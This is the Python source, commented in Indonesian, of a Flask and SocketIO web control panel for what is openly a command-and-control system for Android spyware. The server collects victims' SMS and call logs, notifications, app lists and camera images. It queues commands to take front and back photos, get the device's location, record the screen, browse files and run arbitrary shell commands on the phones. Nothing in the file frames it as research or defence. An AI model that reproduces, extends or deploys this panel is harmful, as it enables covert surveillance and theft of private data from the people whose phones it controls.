#!/usr/bin/env python3
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
import json
import os
import base64
from datetime import datetime
import threading
import logging
from queue import Queue
import requests

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anon-c2-system-v1')

# SocketIO tanpa worker tambahan
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=None)

# --- Konfigurasi ---
FLASK_PORT = int(os.environ.get('PORT', 9191))
SERVER1_URL = os.environ.get('SERVER1_URL', 'http://localhost:9090')
DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'

# --- Global Variables ---
connected_devices = {}
device_data_queues = {}
current_device = None
command_queue = Queue()

# --- Setup Logging ---
logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- Directory Setup ---
for dir_name in ['web_downloads', 'web_images', 'web_recordings']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# ==================== ROUTES ====================

@app.route('/')
def index():
    """Halaman utama"""
    return render_template('index.html')

@app.route('/health')
def health():
    """Health check endpoint untuk Railway"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'devices_connected': len(connected_devices)
    })

@app.route('/api/devices')
def get_devices():
    """Endpoint untuk mendapatkan list device yang terkoneksi"""
    devices_list = []
    for device_id, info in connected_devices.items():
        devices_list.append({
            'id': device_id,
            'model': info.get('model', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'android_version': info.get('android_version', 'Unknown'),
            'battery': info.get('battery', 'Unknown'),
            'last_seen': info.get('last_seen', datetime.now().isoformat()),
            'ip': info.get('ip', 'Unknown')
        })
    return jsonify({'devices': devices_list})

@app.route('/api/select_device', methods=['POST'])
def select_device():
    """Memilih device untuk dikontrol"""
    global current_device
    data = request.json
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        current_device = device_id
        logger.info(f"Device selected: {device_id}")
        return jsonify({
            'status': 'success',
            'device': connected_devices[device_id]
        })
    return jsonify({'status': 'error', 'message': 'Device not found'}), 404

@app.route('/api/device_info')
def get_device_info():
    """Mendapatkan info device yang sedang dipilih"""
    if current_device and current_device in connected_devices:
        return jsonify(connected_devices[current_device])
    return jsonify({'status': 'error', 'message': 'No device selected'}), 400

@app.route('/api/command', methods=['POST'])
def send_command():
    """Mengirim command ke device melalui server1"""
    if not current_device:
        return jsonify({'status': 'error', 'message': 'No device selected'}), 400
    
    data = request.json
    command = data.get('command')
    params = data.get('params', {})
    
    # Format command sesuai dengan yang dimengerti server1
    cmd_str = format_command(command, params)
    
    # Kirim ke server1 via queue
    command_queue.put({
        'device_id': current_device,
        'command': cmd_str,
        'timestamp': datetime.now().isoformat()
    })
    
    logger.info(f"Command queued: {cmd_str} for device {current_device}")
    
    return jsonify({
        'status': 'queued',
        'command': cmd_str
    })

@app.route('/api/data', methods=['POST'])
def receive_data():
    """Endpoint untuk menerima data dari server1.py"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
            
        data_type = data.get('type')
        payload = data.get('payload')
        client_info = data.get('client_info', {})
        
        # Generate device ID dari IP
        device_id = client_info.get('address', f"device_{len(connected_devices)}")
        
        # Update atau tambah device
        if data_type == 'DEVICE_INFO':
            connected_devices[device_id] = {
                'id': device_id,
                'ip': client_info.get('address'),
                'model': payload.get('Model'),
                'manufacturer': payload.get('Manufacturer'),
                'android_version': payload.get('AndroidVersion'),
                'battery': payload.get('Battery'),
                'last_seen': datetime.now().isoformat(),
                'connected': True
            }
            logger.info(f"Device connected: {payload.get('Model')} from {client_info.get('address')}")
            socketio.emit('device_connected', connected_devices[device_id])
        
        # Simpan data ke queue per device
        if device_id not in device_data_queues:
            device_data_queues[device_id] = []
        
        device_data_queues[device_id].append({
            'type': data_type,
            'payload': payload,
            'timestamp': datetime.now().isoformat()
        })
        
        # Broadcast realtime ke web client
        if current_device == device_id:
            socketio.emit('device_data', {
                'type': data_type,
                'payload': payload,
                'timestamp': datetime.now().isoformat()
            })
        
        # Handle specific data types
        if data_type == 'SMS_LOG':
            socketio.emit('new_sms', payload.get('log', {}))
        elif data_type == 'CALL_LOG':
            socketio.emit('new_call', payload.get('log', {}))
        elif data_type == 'NOTIFICATION_DATA':
            socketio.emit('new_notification', payload.get('notification', {}))
        elif data_type == 'IMAGE_DATA':
            save_image_for_web(payload.get('image', {}), device_id)
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        logger.error(f"Error receiving data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/sms_logs')
def get_sms_logs():
    """Mendapatkan SMS logs"""
    if not current_device:
        return jsonify([])
    
    logs = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'SMS_LOG':
                logs.append(item['payload'].get('log', {}))
                if len(logs) >= 50:
                    break
    
    return jsonify(logs)

@app.route('/api/call_logs')
def get_call_logs():
    """Mendapatkan Call logs"""
    if not current_device:
        return jsonify([])
    
    logs = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'CALL_LOG':
                logs.append(item['payload'].get('log', {}))
                if len(logs) >= 50:
                    break
    
    return jsonify(logs)

@app.route('/api/apps')
def get_apps():
    """Mendapatkan list aplikasi"""
    if not current_device:
        return jsonify([])
    
    apps = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'APP_LIST':
                apps = item['payload'].get('apps', [])
                break
    
    return jsonify(apps)

@app.route('/api/image/<filename>')
def get_image(filename):
    """Mengambil image yang sudah disimpan"""
    try:
        return send_file(os.path.join('web_images', filename))
    except:
        return jsonify({'error': 'Image not found'}), 404

# ==================== Helper Functions ====================

def format_command(cmd, params):
    """Format command sesuai dengan format server1"""
    commands = {
        'run': f"run {params.get('package')}",
        'open': f"open {params.get('url')}",
        'toast': f"toast {params.get('action')} {params.get('text')}",
        'shell': "shell",
        'getsms': "getsms",
        'getcalllogs': "getcalllogs",
        'list_app': "list_app",
        'get_location': "get_location",
        'takefrontpic': "takefrontpic",
        'takebackpic': "takebackpic",
        'flashon': "flashon",
        'flashoff': "flashoff",
        'notifikasi': "notifikasi",
        'gallery': "gallery",
        'deviceinfo': "deviceinfo",
        'screen_recorder': "screen_recorder",
        'filemanager': "filemanager",
        'shell_cmd': params.get('cmd', ''),
        'shell_cd': f"cd {params.get('path')}",
        'shell_ls': "ls",
        'shell_exit': "exit_shell"
    }
    return commands.get(cmd, cmd)

def save_image_for_web(image_data, device_id):
    """Menyimpan image untuk diakses via web"""
    try:
        filename = image_data.get('filename', f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filename = "".join(c for c in filename if c.isalnum() or c in '._-')
        filepath = os.path.join('web_images', f"{device_id}_{filename}")
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data.get('image_base64', '')))
        
        socketio.emit('new_image', {
            'filename': filename,
            'url': f'/api/image/{device_id}_{filename}',
            'timestamp': datetime.now().isoformat()
        })
        
        logger.info(f"Image saved: {filename}")
    except Exception as e:
        logger.error(f"Error saving image: {e}")

# ==================== SocketIO Events ====================

@socketio.on('connect')
def handle_connect():
    logger.info(f"Web client connected: {request.sid}")
    emit('connected', {'status': 'ok'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Web client disconnected: {request.sid}")

@socketio.on('request_devices')
def handle_request_devices():
    devices_list = []
    for device_id, info in connected_devices.items():
        devices_list.append({
            'id': device_id,
            'model': info.get('model', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'battery': info.get('battery', 'Unknown')
        })
    emit('devices_list', devices_list)

@socketio.on('select_device')
def handle_select_device(data):
    global current_device
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        current_device = device_id
        emit('device_selected', connected_devices[device_id])

@socketio.on('web_command')
def handle_web_command(data):
    if not current_device:
        emit('command_error', {'message': 'No device selected'})
        return
    
    cmd = data.get('command')
    params = data.get('params', {})
    
    cmd_str = format_command(cmd, params)
    command_queue.put({
        'device_id': current_device,
        'command': cmd_str
    })
    
    emit('command_sent', {'command': cmd_str})

# ==================== Background Thread ====================

def command_processor():
    """Thread untuk memproses command queue"""
    while True:
        try:
            if not command_queue.empty():
                cmd_data = command_queue.get()
                logger.info(f"Processing command: {cmd_data}")
                # TODO: Implement send to server1
        except Exception as e:
            logger.error(f"Command processor error: {e}")
        threading.Event().wait(0.1)

# Start background thread
threading.Thread(target=command_processor, daemon=True).start()

# ==================== Main ====================

if __name__ == '__main__':
    logger.info(f"Starting Flask server on port {FLASK_PORT}")
    logger.info(f"Debug mode: {DEBUG}")
    socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=DEBUG)
